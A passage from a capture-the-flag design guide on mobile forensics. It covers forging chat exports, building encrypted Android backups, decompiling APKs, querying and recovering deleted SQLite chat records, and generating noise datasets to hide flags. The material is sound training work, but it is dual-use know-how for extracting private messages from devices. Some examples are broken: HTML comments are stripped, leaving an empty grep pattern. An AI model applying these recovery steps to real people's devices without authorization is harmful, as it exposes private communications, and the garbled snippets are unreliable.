    print(f"[+] Generated {output_file} with {message_count} messages.")

# --- Configuration ---
participants_list = ["Alice", "Bob"]
# Start date: Nov 20, 2025 at 9:00 AM
start_dt = datetime(2025, 11, 20, 9, 0, 0)

generate_whatsapp_log("WhatsApp Chat with Bob.txt", participants_list, 200, start_dt)
```

Method B: Direct Database Manipulation (Advanced)

If the CTF requires analyzing the msgstore.db (SQLite) rather than a text export:

1. Open a valid `msgstore.db` template in **DB Browser for SQLite**.
    
2. Navigate to the `messages` table.
    
3. Execute SQL to insert records:
    
    SQL
    
    ```
    INSERT INTO messages (key_remote_jid, data, timestamp, media_wa_type)
    VALUES ('123456789@s.whatsapp.net', 'flag{sqlite_injection}', 1763721600000, 0);
    ```
    
4. _Note:_ You must convert standard time to Unix Epoch (milliseconds) for WhatsApp databases.
    

#### 3. Example Scenario

Scenario Name: "The Dissident's Backup"

The Artifact: A file named ChatExport_2025-11-21.zip.

The Context: A whistleblower claimed they sent the decryption key for a leaked document via Telegram, but they deleted the app. They managed to export the chat history before deleting it.

The Challenge: The zip contains a 5MB messages.html file (Telegram export style).

The Puzzle: The visual HTML renders thousands of "Message deleted" entries. However, inspecting the source code or using grep reveals that the Architect (you) embedded the flag in the HTML comments `` next to the "deleted" markers, or used a "Zero-Width Space" steganography attack inside the visible text of the remaining messages.

#### 4. Key Tools

- **Python:** The primary tool for scripting large-volume text generation with correct timestamp sequencing.
    
- **DB Browser for SQLite:** Essential for creating or modifying the `.db` files if the challenge involves forensic database extraction rather than text exports.
    
- **Fake Chat Maker Apps:** (Mobile Apps like "Whatsmock") These can be used to manually create a screenshot-based challenge or a small export, though they are less efficient for large datasets than Python scripts.

---

### Creating full ADB backups with encrypted data

#### 1. Technical Theory

The Android Debug Bridge (ADB) backup command allows users to dump application data, APKs, and shared storage to a host computer. The resulting file typically has the `.ab` (Android Backup) extension.

- **File Structure:** An `.ab` file is essentially a modified TAR archive. It uses the Deflate compression algorithm.
    
- **Encryption Mechanism:** When a user provides a password during the backup process, the backup is encrypted using **AES-256-CBC**.
    
- **Key Derivation:** The encryption key is derived from the user-supplied password using **PBKDF2** (Password-Based Key Derivation Function 2) with a random salt.
    
- **Header Analysis:**
    
    - **Unencrypted:** Starts with magic bytes `ANDROID BACKUP\n1\n1\nnone`.
        
    - **Encrypted:** Starts with `ANDROID BACKUP\n5\n1\nAES-256`.
        

#### 2. Practical Implementation (The "How-To")

As the **Architect**, you need an Android environment (Physical device or Emulator via Android Studio) to generate this artifact. You cannot purely script the creation of a valid `.ab` file without the Android OS generating the necessary headers and TAR structure, so the process involves interacting with the ADB shell.

**Prerequisites:**

- Android SDK Platform Tools (`adb` installed).
    
- An Android Emulator (AVD) or rooted physical device with "USB Debugging" enabled.
    

Step 1: Plant the Flag

Before backing up, ensure the flag exists within the app data or shared storage.

Bash

```
# Push a flag to the device's SD card area
adb push flag.txt /sdcard/Download/flag.txt

# OR create a specific file in an app's private directory (requires root to place manually, 
# or install a custom debuggable APK that writes the file)
adb shell "echo 'CTF{andr0id_b4ckups_4r3_t4r_f1l3s}' > /sdcard/secrets.txt"
```

Step 2: Execute the Backup Command

Run the backup command from your host terminal.

- `-all`: Backs up all installed applications.
    
- `-apk`: Includes the `.apk` files themselves.
    
- `-shared`: Includes the SD card / external storage content.
    
- `-f`: Specifies the output filename.
    

Bash

```
adb backup -all -apk -shared -f challenge_encrypted.ab
```

Step 3: Apply Encryption (The Human Interaction)

Once the command runs, the terminal will hang. You must look at the Android device screen.

1. A prompt will appear: _"Full backup requested"_.
    
2. **Enter a password** in the encryption field (e.g., "hunter2"). This password is crucial; without it, the backup is cleartext.
    
3. Tap **"Back up my data"**.
    

Step 4: Verification (Optional Java Tool)

To ensure your challenge is solvable, verify the backup can be unpacked using the password. You can use the abe.jar (Android Backup Extractor) tool for this architect check.

Bash

```
# Syntax: java -jar abe.jar unpack <backup.ab> <output.tar> [password]
java -jar abe.jar unpack challenge_encrypted.ab check_content.tar hunter2
```

#### 3. Example Scenario

**Scenario Title:** "Broken Screen, Locked Vault"

Description:

"We recovered a backup file (my_phone_dump.ab) from a suspect's laptop. We believe they were communicating with a cartel using a secure chat app. We need the chat logs. We also found a sticky note with the code 8542 on their desk."

**The Challenge Setup:**

1. You create the backup using the password `8542`.
    
2. The Flag is hidden inside a file named `chat_log.db` (or a text file) inside the backup.
    
3. **The Solve:** The participant must realize the file is an encrypted Android Backup. They must use a tool like `abe.jar` or OpenSSL logic to decrypt it using the pin found on the sticky note (`8542`), convert it to a TAR file, extract it, and read the file.
    

#### 4. Key Tools

- **Android Debug Bridge (adb):** The primary tool for communicating with the device and initiating the backup protocol.
    
- **Android Studio (AVD Manager):** Used to create virtual devices for a safe, controlled environment to generate forensic artifacts.
    
- **Android Backup Extractor (abe.jar):** While primarily a solver tool, it is essential for the Architect to verify that the encryption was applied correctly and that the password works.

---


## The Investigator (Solution)

### Decompiling APKs (jadx, apktool)

#### 1. Technical Theory

Decompilation is the process of reversing compiled machine or intermediate code back into a higher-level human-readable language (like Java or Smali). An Android Package Kit (**APK**) is a ZIP archive containing the compiled application code in one or more **Dalvik Executable (.dex)** files, along with resources, assets, and the `AndroidManifest.xml`.

- **JADX (Java Decompiler for Android):** Directly converts Dalvik bytecode (`.dex`) into readable **Java** source code. This is the primary tool for static analysis, allowing the investigator to quickly read the high-level logic and locate hardcoded strings, function calls, and application flow.
    
- **APKTool:** Converts the `.dex` file into **Smali** code (a human-readable assembly language for the Dalvik VM). It also reconstructs resources into their original formats (e.g., `strings.xml`, drawables). APKTool is essential for modifying the APK structure or analyzing obfuscated code when high-level Java reconstruction fails.
    

#### 2. Practical Implementation (The "How-To")

**Perspective: The Investigator**

The goal is to perform **static analysis** by extracting the application's source code and resources to locate logic flaws or hidden flags.

A. High-Level Analysis with JADX (Java Source)

JADX provides the fastest path to reading the application's logic and finding basic flags.

- **Installation:** Download the latest JADX release (usually a JAR or binary executable).
    
- **Decompilation Command:** Simply point JADX to the target APK file.
    
    Bash
    
    ```
    # Decompile and output the source code to a directory
    jadx -d output_directory target_app.apk
    ```
    
- **Key Search Areas:**
    
    - **Search Tab:** Use the built-in search function to look for keywords like `flag`, `CTF{`, `password`, `key`, or the package name of common encryption libraries.
        
    - **`MainActivity.java`:** The primary entry point for the app logic.
        
    - **`Constants.java` or `Config.java`:** Common files where developers place hardcoded strings and configuration data.
        

B. Low-Level Analysis and Resource Extraction with APKTool (Smali & Resources)

APKTool is essential for accessing structured resources and for modifying the app (reversing an obfuscated check).

- **Installation:** Follow the official instructions to install the `apktool` wrapper script.
    
- **Decompilation Command:** This command creates a structured folder with Smali code and decoded resources.
    
    Bash
    
    ```
    # Decode the APK
    apktool d target_app.apk -o target_folder
    ```
    
- **Key Search Areas within the Output Folder:**
    
    - **`res/values/strings.xml`:** Contains most human-readable text used by the application, often including flags or hints.
        
    - **`smali/` directory:** Contains the Smali assembly code. You must search here if Java decompilation fails or if the app uses native code calls. Look for the `Lcom/package/name/MainActivity;` Smali file for the main logic.
        
    - **`AndroidManifest.xml`:** Reveals permissions, activities, services, and potential **deep link** schemes that could be exploited.
        

C. Analyzing Obfuscation (Smali)

If the flag is XOR-encrypted in Java (as a previous Architect example showed), the investigator must locate the decryption function.

1. Use **JADX** to find the class with the encrypted string and the decryption function (e.g., `String decrypt(byte[] data)`).
    
2. If the names are obfuscated (e.g., `a.b.c`), use **APKTool** to locate the corresponding Smali file in the `smali/` directory.
    
3. Search the Smali code for the static **encrypted byte array** declaration (`.field private static final a:[B = {0x...}`). This array, when XORed with the key, reveals the flag.
    

#### 3. Example Scenario

Title: The Locked Resource

Scenario: The investigator is provided with secure_login.apk. The login screen states, "Enter the flag as the password."

Analysis:

1. The investigator runs **JADX** on the APK. The Java source code shows that the password check logic is very complex, calling a heavily obfuscated function.
    
2. The investigator runs **APKTool** to decode the resources.
    
3. Searching the output folder, the investigator finds a suspicious file: `target_folder/res/raw/config_data.bin`.
    
4. Opening the binary file reveals plain text: `FlagIsHere: CTF{r3s0urc3s_r3v34l_4ll}`. The architect intended the investigator to waste time on the Java logic, but the flag was simply hidden as an uncompiled asset.
    

#### 4. Key Tools

- **JADX (Java Decompiler for Android):** The primary tool for quick static analysis and high-level code recovery.
    
    - _Repo:_ [https://github.com/skylot/jadx](https://github.com/skylot/jadx)
        
- **APKTool:** Essential for rebuilding the resource structure, analyzing Smali code, and editing the `AndroidManifest.xml` for repackaging.
    
- **Ghidra:** While heavier than JADX, Ghidra is necessary if the application hides the flag within a **Native Library (.so)**, as it provides a comprehensive disassembler/decompiler for the underlying C/C++ assembly code.

---

### SQLite database browser and query analysis

#### 1. Technical Theory

SQLite is a self-contained, serverless, transactional SQL database engine that stores entire databases in a single cross-platform file (e.g., `messages.db`, `browser.db`). It is the primary method for storing structured local data in both **Android** and **iOS** applications (e.g., messages, contacts, web history, location data, notes).

The forensic investigator's goal is to:

1. **Locate** the relevant application database files (often found in `/data/data/<package.name>/databases/`).
    
2. **Inspect** the tables and schema to understand what data is stored.
    
3. **Execute SQL queries** to filter noise, convert timestamps, and extract the flag data efficiently.
    

#### 2. Practical Implementation (The Investigator)

The analysis workflow typically starts with a **SQLite GUI browser** for initial triage, followed by the **command line interface (CLI)** or the browser's **Execute SQL** tab for targeted analysis.

Step 1: Database Triage (DB Browser for SQLite)

Use a dedicated browser like DB Browser for SQLite to load the database file (.db, .sqlite, or files without an extension that are SQLite databases).

- **Schema Inspection:** Navigate to the **Database Structure** tab to view all tables and their columns. This reveals potential data artifacts, such as tables named `deleted_messages`, `zMessage`, or `history_visits`.
    
- **Initial Data View:** Use the **Browse Data** tab to quickly look at the contents of key tables (e.g., `messages`, `calls`) to identify the column names used for timestamps, user IDs, and message bodies.
    

Step 2: Essential Forensic SQL Queries

Once the relevant table (tablename) and columns are identified, use SQL to perform targeted filtering and data cleanup.

|**Objective**|**SQL Query Example**|**Rationale**|
|---|---|---|
|**View Table Schema**|`PRAGMA table_info(tablename);`|Reveals column names, data types, and primary keys for precise query construction.|
|**Convert Unix Epoch Time**|`SELECT datetime(timestamp_col, 'unixepoch') FROM tablename;`|Converts standard 10-digit (seconds) Unix timestamps to a readable `YYYY-MM-DD HH:MM:SS` format.|
|**Convert Milliseconds Time**|`SELECT datetime(date_col / 1000, 'unixepoch', 'localtime') FROM tablename;`|Converts common 13-digit (milliseconds) mobile timestamps to a readable local time format. **Crucial for mobile data.**|
|**Keyword Flag Hunt**|`SELECT * FROM messages WHERE body LIKE '%FLAG%';`|Searches the message body column for any entry containing the string "FLAG" (case-insensitive depending on database collation).|
|**Filter by Date/Time Range**|`SELECT * FROM contacts WHERE date_created > 1672531200000;`|Filters data generated after a specific millisecond timestamp (January 1, 2023, 00:00:00 UTC).|
|**Identify Deleted Records**|_Not a standard SQL query._|Requires specialized tools (like **SQLite Forensics tools** or **hex editors** used by forensic suites) to examine the free-list pages, journal files, and Write-Ahead Logging (WAL) files for recoverable orphaned/deleted rows.|

Step 3: SQLite CLI (Advanced)

The native SQLite command-line tool is useful for batch processing and working within scripts.

Bash

```
# Load the database
sqlite3 artifacts/chat_log.db

# Set output mode for readable display
.mode box
.headers on

# Execute a complex query to find the flag from 3 days ago
SELECT datetime(ZDATE / 1000, 'unixepoch'), ZTEXT
FROM ZMESSAGE
WHERE ZTEXT LIKE '%key%' AND ZDATE > strftime('%s', 'now', '-3 day') * 1000;

# Exit the CLI
.quit
```

#### 3. Example Scenario

Scenario Name: "Orphaned Artifact"

Description: The investigator is analyzing a mobile browser history database (browser_history.db). The suspect claimed they never visited a specific site (evilcorp.com).

Analysis:

1. The investigator opens the `browser_history.db` and queries the primary `urls` table: `SELECT url FROM urls WHERE url LIKE '%evilcorp.com%'`. This returns **no results**.
    
2. The investigator suspects the rows were deleted and the database was not fully vacuumed. They look for orphaned records that haven't been overwritten yet using specialized recovery software or by analyzing the raw database file's **free list pages**.
    
3. A deleted record recovery tool extracts an **orphaned row** containing the URL `evilcorp.com/secret/FLAG{d3l3t3d_r0w}` which was marked for deletion but not overwritten.
    

#### 4. Key Tools

- **DB Browser for SQLite:** Recommended cross-platform GUI tool for visual inspection, schema analysis, and query execution.
    
- **SQLite CLI:** Essential for scripting, piping output, and executing queries rapidly on Linux/macOS forensic workstations.
    
- **Magnet AXIOM / Autopsy:** Full forensic suites that automate the parsing and querying of hundreds of common mobile SQLite databases, often highlighting relevant timestamps and known artifacts.

---

### Parsing and validating proprietary chat export formats (JSON, plain text, cryptographic databases)

#### 1. Technical Theory

The investigator's primary challenge is not recovery but **validation** and **noise reduction**. Since chat exports are designed for readability, the raw text files or simplified HTML/JSON reports often contain thousands of filler messages (`lol`, `k`, `audio omitted`), creating a high-volume data set.

- **Format-Specific Regex:** Successful parsing hinges on creating a **Regular Expression** that strictly matches the expected timestamp format _and_ captures the message content reliably, discarding extraneous headers or system messages. Any deviation (e.g., `mm/dd/yy` vs. `dd/mm/yy`) will cause the parser to fail.
    
- **Timestamp Consistency:** Anomalies like reverse chronological order, missing date entries, or messages appearing within the same second from different senders often indicate forgery, script injection, or an attempt to bypass automated analysis.
    
- **Database Forensics:** If the artifact is the native database (e.g., SQLite), the investigator must understand the **schema** (table names, column names) to query the raw data, bypassing any export feature limitations.
    

#### 2. Practical Implementation (The Investigator)

The investigator must use command-line tools for efficiency and custom scripts for complex parsing.

A. Command Line Content Parsing (High-Volume Text)

Use grep to quickly filter thousands of messages by content, time, or sender, focusing on key elements.

Bash

```
# 1. Search for potential flags or keys using regex on the entire log file
# Example targets: standard flag format (flag{...}), passwords, base64 strings
grep -iE '(flag\{|password|key:|base64|fl[a-z]{3}_p[a-z]{3})' "WhatsApp Chat with Bob.txt"

# 2. Filter messages to a specific time window (e.g., only messages from 9 AM to 1 PM)
# Look for a specific timestamp pattern (Android example: 11/21/25, 09:xx)
grep -E '11/21/25, (09|1[0-2]):[0-5][0-9]' "WhatsApp Chat with Bob.txt"
```

B. Python Script for Data Normalization and Validation

For comprehensive analysis, a script is needed to parse, normalize (convert all timestamps to a standard format), and perform validation checks.

Python

```
import re
from datetime import datetime

def parse_chat_log(file_path):
    """Parses a WhatsApp (Android) log, validates chronology, and extracts messages."""
    
    # WhatsApp Android Regex: MM/DD/YY, HH:MM - Sender: Message
    # Group 1: Month, Group 2: Day, Group 3: Year, Group 4: Hour, Group 5: Minute, Group 6: Sender, Group 7: Message
    # Note: Use non-greedy match for the message
    WA_REGEX = r'(\d{1,2})/(\d{1,2})/(\d{2}), (\d{1,2}):(\d{2}) - ([^:]+?): (.*)'
    
    parsed_messages = []
    last_timestamp = None
    
    with open(file_path, 'r', encoding='utf-8') as f:
        for line_num, line in enumerate(f):
            match = re.match(WA_REGEX, line)
            
            if match:
                # Reconstruct and parse the timestamp string (e.g., 11/21/25, 14:30)
                timestamp_str = f"{match.group(1)}/{match.group(2)}/{match.group(3)}, {match.group(4)}:{match.group(5)}"
                current_timestamp = datetime.strptime(timestamp_str, "%m/%d/%y, %H:%M")

                # *** Validation Check: Chronology ***
                if last_timestamp and current_timestamp < last_timestamp:
                    print(f"FORGERY ALERT: Timestamp regression detected at line {line_num + 1}!")
                    
                parsed_messages.append({
                    "time": current_timestamp,
                    "sender": match.group(6).strip(),
                    "message": match.group(7).strip()
                })
                last_timestamp = current_timestamp
                
    return parsed_messages

# --- Execution ---
messages = parse_chat_log("WhatsApp Chat with Bob.txt")
print(f"Total messages parsed: {len(messages)}")
```

C. Database Analysis (SQLite Artifacts)

If the artifact is a database file (e.g., msgstore.db), specialized tools or direct SQL are required.

SQL

```
-- SQL Query in DB Browser for SQLite or command-line sqlite3
-- Retrieve all messages containing the string 'fl4g'
SELECT 
    datetime(timestamp / 1000, 'unixepoch', 'localtime') AS LocalTime, 
    key_remote_jid AS ChatID, 
    data AS MessageContent
FROM 
    messages 
WHERE 
    MessageContent LIKE '%fl4g%' 
ORDER BY 
    timestamp ASC;
```

#### 3. Example Scenario

**Scenario Name: "The Dissident's Backup"**

- **The Artifact:** A 5MB `messages.html` file (Telegram export style).
    
- **The Twist:** The file contains thousands of entries labeled `<div class="deleted_message">Message deleted</div>`.
    
- **The Solution:** The investigator uses content-based search on the raw file content, understanding that the visual render is often different from the underlying HTML source.
    
    1. The investigator uses `grep` on the raw `.html` file, looking for non-visible elements like HTML comments or known flag patterns.
        
        Bash
        
        ```
        grep -oE "" messages.html
        # Output: ```
        ```
        
    2. Alternatively, the investigator suspects **Zero-Width Space (ZWS)** steganography. They would load the text into a script to check for ZWS characters (Unicode U+200B) often inserted between visible characters to encode binary data.
        

#### 4. Key Tools

- **`grep` / `find`:** Essential command-line utilities for efficient, high-speed content filtering and searching in large text files.
    
- **Python (with `re` module):** The gold standard for developing custom parsers to validate format consistency, detect chronological anomalies, and extract specific data fields.
    
- **DB Browser for SQLite:** Necessary for interacting with and querying the native mobile database files (`.db`), bypassing the limitations of simplified text exports.

---

### Parsing backup.ab or iTunes backup files

#### 1. Technical Theory

Mobile forensics often relies on analyzing local backup files, which are complex formats designed for restoration, not analysis.

- **Android Backup (`backup.ab`):** This file is a modified **TAR archive**. The file begins with a plain text **header** describing the backup format version, compression method (e.g., `none` or `zlib`), and encryption status (e.g., `AES-256`). The header must be removed before the archive can be decompressed and extracted.
    
- **iTunes Backup (iOS):** This is not a single archive file but a **directory structure** containing thousands of files. The actual files are stored in subdirectories named after their first two SHA-1 hash bytes (e.g., `3d/3d0b2f...`). The critical files are the **Manifests**, which map these cryptic filenames back to their original absolute paths on the device.
    
    - `Manifest.plist`: Contains global backup metadata.
        
    - `Manifest.db`: An **SQLite database** containing the definitive mapping of the SHA-1 hashed filenames to their original domains and file paths.
        

#### 2. Practical Implementation (The "How-To")

**Method A: Android `backup.ab` Extraction**

The investigative process requires sequentially stripping the header, decrypting (if necessary), and decompressing the data stream.

1. **Header Strip:** Use `dd` to isolate the data stream. The header is typically five lines long, followed by a double newline (`\n\n`), placing the start of the compressed data at a known offset (often 24 bytes).
    
    Bash
    
    ```
    # Command to strip the header and pipe the raw data
    # (Requires determining the exact header size via 'cat -A backup.ab')
    # Assuming the header is 24 bytes long:
    dd if=backup.ab bs=1 skip=24 | zlib-flate -uncompress > payload.tar
    
    # Alternatively, use ABE for decryption and extraction:
    java -jar abe.jar unpack backup.ab backup.tar <password>
    ```
    
2. **Unpack the TAR:** Once the data is decompressed, it can be extracted like any standard tar archive.
    
    Bash
    
    ```
    tar xvf payload.tar
    ```
    
    _Focus:_ Investigators should immediately target files within the `/apps/com.<package.name>/db/` (for SQLite databases) and `/apps/com.<package.name>/sp/` (for XML Shared Preferences).
    

**Method B: iTunes Backup File Mapping**

The primary challenge in iOS analysis is mapping the hashed files to find critical application databases.

1. **Locate Manifests:** The core mapping data is in the `Manifest.db` file, which is a standard SQLite database.
    
2. **Query the Mapping:** Use Python's `sqlite3` library to query the `Files` table in `Manifest.db`. The relevant columns are `relativePath` (the original file path on the phone) and `fileID` (the SHA-1 hash that names the file in the backup directory).
    

Python

```
import sqlite3
import os

def map_ios_files(backup_path):
    """Queries Manifest.db to map hashed file IDs to original paths."""
    manifest_db = os.path.join(backup_path, 'Manifest.db')
    if not os.path.exists(manifest_db):
        print(f"[-] Error: Manifest.db not found at {manifest_db}")
        return

    conn = sqlite3.connect(manifest_db)
    cursor = conn.cursor()
    
    # Query for the fileID (used for hashing) and the relativePath
    query = """
    SELECT 
        fileID, 
        relativePath
    FROM 
        Files
    WHERE 
        relativePath LIKE 'Library/SMS/sms.db' OR 
        relativePath LIKE 'AppDomain-com.apple.mobilephone/Library/CallHistory/call_history.storedata'
    """
    
    mapping = {}
    for row in cursor.execute(query):
        fileID = row[0]
        # The file is stored as the full SHA-1 hash, but named by the first two pairs.
        # e.g., fileID=3d0d7e5fb2ce288813306e4a4d2403848b5ff326 -> stored at 3d/3d0d7e...
        storage_path = os.path.join(fileID[:2], fileID)
        
        print(f"[+] Found Target: {row[1]} -> Stored at: {storage_path}")
        mapping[row[1]] = storage_path

    conn.close()
    return mapping

# Example Usage (assuming backup is in the current directory)
# target_mapping = map_ios_files('./iTunes_Backup_Folder/')
```

#### 3. Example Scenario

Scenario Name: "The Encrypted Signal"

The Artifact: An Android backup file named victim.ab is found, along with a note containing a potential password clue.

The Challenge: The header of victim.ab indicates it is AES-256 encrypted. The investigator successfully decrypts and extracts the .tar archive.

The Clue: The flag is not in the standard SMS or call logs. Instead, it is found in the Signal Messenger application's local database (/apps/org.thoughtcrime.securesms/db/signal.db). The flag text is hidden in an unseen column or a database transaction that was not successfully committed, requiring the investigator to use sqlite3 to dump the entire schema and look for hidden tables.

#### 4. Key Tools

- **Android Backup Extractor (ABE):** The foundational open-source tool (`abe.jar`) used to decrypt and decompress `backup.ab` files.
    
- **iLEAPP (iOS Log & Events Analysis Tool) / iBackup Extractor:** Automated scripts and tools that parse the `Manifest.db` and extract common forensic artifacts (SMS, Call History, Locations) into readable formats.
    
- **Python:** Essential for programmatic handling of data streams (`zlib`, `tarfile` for Android) and database manipulation (`sqlite3` for iOS `Manifest.db` and application DBs).

---

### Recovering deleted chat artifacts

#### 1. Technical Theory

Most mobile chat applications (WhatsApp, Telegram, Signal, iMessage) utilize **SQLite databases** to store message history, contacts, and metadata. When a user "deletes" a message, the data is rarely erased immediately.

- **Soft Deletion:** The most common method is a **soft delete**, where the record remains in the database but a flag (e.g., `is_deleted = 1` or `status = 6`) is set. This data is easily recovered via simple SQL queries.
    
- **Database Architecture Persistence:** Even when a record is physically removed from the B-Tree structure, the raw data often remains in one of three places until the space is explicitly overwritten:
    
    1. **Free Lists/Unallocated Space:** Space within the `.db` file that has been marked as available but still holds the original data blocks.
        
    2. **Journal Files (or WAL):** Transaction logs (`.db-journal` or `.db-wal`) record changes before they are committed to the main database file. Deleted messages may exist in these logs.
        
    3. **Write-Ahead Logging (WAL):** A mode where data is written to a separate `.db-wal` file before merging into the main `.db`. This significantly increases the likelihood of recovering recent, deleted data.
        

---

#### 2. Practical Implementation (The "How-To")

As **The Investigator**, your steps focus on accessing the raw database files and extracting readable strings from unallocated space.

A. Simple String Extraction (Free Space Recovery)

The fastest, most common CTF technique is using the strings utility on the raw database file to pull out human-readable content that still resides in the file's unallocated blocks.

Bash

```
# 1. Use strings on the main database file and pipe to grep for filtering
# Example: Targeting a WhatsApp database file for message text.
strings wa.db | grep "CTF"

# 2. Also check the associated journal or WAL file
strings wa.db-journal | less

# 3. For bulk output, save everything readable to a text file
strings wa.db > wa_db_free_space.txt
```

B. SQL Querying (Soft Deletion Detection)

If the message was only soft-deleted (flagged but not physically removed), you can recover it using standard SQL queries. This requires knowing the schema.

SQL

```
-- Open the SQLite database
.open sms.db

-- Query for deleted messages (schema-dependent, common columns shown)
SELECT 
    text, 
    datetime(date / 1000000000 + 978307200, 'unixepoch') AS timestamp 
FROM 
    message 
WHERE 
    is_deleted = 1 
OR 
    service = 0 
LIMIT 10;
```

C. Python Scripting for Targeted Free Block Analysis

For advanced recovery, a custom script can analyze the database structure, specifically reading data blocks marked as free by the page header. This requires the sqlite3 module and knowledge of the SQLite file format specification.

Python

```
import sqlite3
import re

def search_free_space(db_path, keyword):
    """Connects to the DB and runs strings-like search on the file content."""
    try:
        with open(db_path, 'rb') as f:
            raw_data = f.read()
            
        # Regex to find human-readable text that contains the keyword
        # Note: This is an approximation of "strings" focused on a keyword.
        # True free space parsing requires knowledge of page structure.
        pattern = re.compile(f'[\x20-\x7E]{{4,}}.*{re.escape(keyword)}.*', re.IGNORECASE)
        
        matches = pattern.findall(raw_data.decode('latin1', errors='ignore'))
        
        if matches:
            print(f"[+] Found {len(matches)} potential deleted artifacts:")
            for match in set(matches): # Use set to display unique matches
                print(f"  -> {match}")
        else:
            print("[-] Keyword not found in raw DB data.")
            
    except FileNotFoundError:
        print(f"Error: Database file not found at {db_path}")

# Usage Example for an iOS iMessage DB
# search_free_space("sms.db", "secret_code")
```

---

#### 3. Example Scenario

**Scenario Title:** "The Ghost Message"

Description:

"The suspect claims they never received a final instruction from their handler. We have an image extraction of their Android device. The flag is a confirmation code they deleted immediately after receiving it in a Telegram chat."

**The Setup:**

1. The investigator extracts the Telegram database file (`org.telegram.messenger.db`).
    
2. The deleted message contained: `Confirmation: CTF{W4L_r3c0v3ry_1s_3z}`.
    
3. The message is not visible in standard chat logs.
    

The Solution:

The participant must realize the deleted message still resides in the associated WAL file (org.telegram.messenger.db-wal). Running the strings utility on the .db-wal file reveals the plaintext flag, as the committed deletion has not yet overwritten the transaction log.

---

#### 4. Key Tools

- **The Sleuth Kit (TSK) / Foremost/Scalpel:** Used for file carving to recover databases (`.db` files) that were deleted entirely from the file system.
    
- **SQLiteBrowser (DB Browser for SQLite):** Essential cross-platform GUI tool for opening and querying databases and manually inspecting data blocks.
    
- **Cellebrite UFED / Oxygen Forensics Detective:** Commercial tools that provide automated recovery of deleted records from free space, journal files, and WAL files across all major chat platforms.
    
- **strings (Unix/Linux):** The primary command-line utility for quickly extracting human-readable text from raw database files to exploit data persistence in unallocated space.


# Module 9: Scripting & Automation

## The Architect (Creation)

### Writing scripts to generate massive datasets (noise) to hide the flag.

#### 1. Technical Theory

In CTF design, "Security through Obscurity" is generally frowned upon unless the volume of data _is_ the challenge. This technique relies on the **Needle in a Haystack** principle.

The Architect's goal is to generate "Structured Noise"—data that looks valid (e.g., proper log formats, valid JSON, readable text) but contains no informational value. This forces the Investigator to move away from manual inspection (reading files) and towards automated analysis (grep, regex, scripting).

**Key attributes of effective noise:**

- **Homogeneity:** The flag should technically resemble the noise (same file type, same encoding) so it cannot be found by simply sorting by file size or date.
    
- **Volume:** The dataset must be large enough (e.g., 100,000 lines or 5,000 files) to make manual review impossible within the CTF timeframe.
    
- **Logic:** There must be a programmatic differentiator (a specific IP, a specific timestamp pattern, or a slight deviation in file header) that isolates the flag.
    

#### 2. Practical Implementation (The "How-To")

Method A: The Infinite Log (Python)

This script generates a realistic-looking Apache/Nginx Access Log. It creates 100,000 lines of traffic. The flag is hidden by splitting it into characters and embedding them in the User-Agent string, but only when the status code is a specific error (e.g., 418 I'm a teapot).

Python

```
import random
import time
import datetime

def generate_log_noise(filename, total_lines):
    ips = ["192.168.1.10", "10.0.0.5", "172.16.0.1", "192.168.1.20"]
    methods = ["GET", "POST", "HEAD"]
    endpoints = ["/index.html", "/contact.php", "/about", "/login", "/api/v1/status"]
    user_agents = ["Mozilla/5.0", "Chrome/90.0", "Safari/14.0", "Edge/88.0"]
    
    flag = "FLAG{l0gs_ar3_just_d1gital_n0is3}"
    flag_index = 0
    # Distribute the flag across the entire file randomly
    flag_positions = sorted(random.sample(range(total_lines), len(flag)))
    
    print(f"[+] Generating {total_lines} lines of log data...")
    
    with open(filename, "w") as f:
        for i in range(total_lines):
            # 1. Default Noise Values
            ip = random.choice(ips)
            method = random.choice(methods)
            uri = random.choice(endpoints)
            agent = random.choice(user_agents)
            status = 200
            size = random.randint(100, 5000)
            
            # 2. Inject Flag Logic
            if i in flag_positions and flag_index < len(flag):
                # Special Condition: Status 418 + Flag Char in User-Agent
                status = 418 
                agent = f"FlagCarrier/1.0 ({flag[flag_index]})"
                flag_index += 1
            
            # 3. Construct Log Line (Common Log Format)
            timestamp = datetime.datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")
            log_line = f'{ip} - - [{timestamp}] "{method} {uri} HTTP/1.1" {status} {size} "-" "{agent}"\n'
            f.write(log_line)
            
    print(f"[+] Done. Log saved to {filename}")

# Generate a 50,000 line log file
generate_log_noise("server_access.log", 50000)
```

Method B: The Recursive File System (Python)

This script creates a "Matryoshka" directory structure with thousands of dummy text files. Only one file contains the flag, but all files have the same size to prevent find . -size shortcuts.

Python

```
import os
import random
import string

def create_haystack(root_dir, depth, files_per_folder):
    os.makedirs(root_dir, exist_ok=True)
    
    # Create dummy files
    for i in range(files_per_folder):
        fname = f"{root_dir}/doc_{random.randint(1000,9999)}.txt"
        # Fill with random base64-like noise
        content = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
        with open(fname, 'w') as f:
            f.write(content)
            
    # Recursion or Stop
    if depth > 0:
        for _ in range(3): # Branch into 3 subfolders
            next_dir = os.path.join(root_dir, f"folder_{random.randint(10,99)}")
            create_haystack(next_dir, depth - 1, files_per_folder)

def inject_flag(root_dir, flag_content):
    # Walk the tree to pick a random location
    all_files = []
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            all_files.append(os.path.join(root, file))
            
    target = random.choice(all_files)
    
    # Overwrite target with flag, PADDED to match noise size
    # If noise is 50 chars, flag must be padded to 50 chars
    padding = 50 - len(flag_content)
    final_content = flag_content + ("#" * padding)
    
    with open(target, 'w') as f:
        f.write(final_content)
    
    print(f"[+] Flag injected into: {target}")

# Usage
root = "./evidence_dump"
create_haystack(root, depth=4, files_per_folder=10) # Creates hundreds of files
inject_flag(root, "FLAG{grep_is_your_friend}")
```

#### 3. Example Scenario

Scenario Name: "Error 404: Patience Not Found"

Description: Participants receive a 2GB text file named database_dump.sql. The prompt reads: "Our database was compromised. We believe the attacker left a signature, but they deleted it. Fortunately, we have the transaction logs. The attacker always used a specific transaction ID: 9999."

The Setup:

1. Use Python to generate millions of SQL `INSERT` statements.
    
2. Standard ID is random between `1000-5000`.
    
3. The script occasionally inserts a line with Transaction ID `9999`.
    
4. The value field of that specific row contains one hex byte of the flag.
    
    Solution Path: The investigator must script a parser (using awk, grep, or python) to extract lines containing 9999 and reassemble the payload from the value fields.
    

#### 4. Key Tools

- **Python (Faker Library):** Excellent for generating realistic names, addresses, and emails to populate noise datasets.
    
- **Bash/Shell Scripting:** Fast for creating file system structures (`mkdir -p {a..z}/{1..100}`).
    
- **dd:** Used to create massive dummy files filled with random data (`/dev/urandom`) to fill disk space and hide slack space artifacts.

---
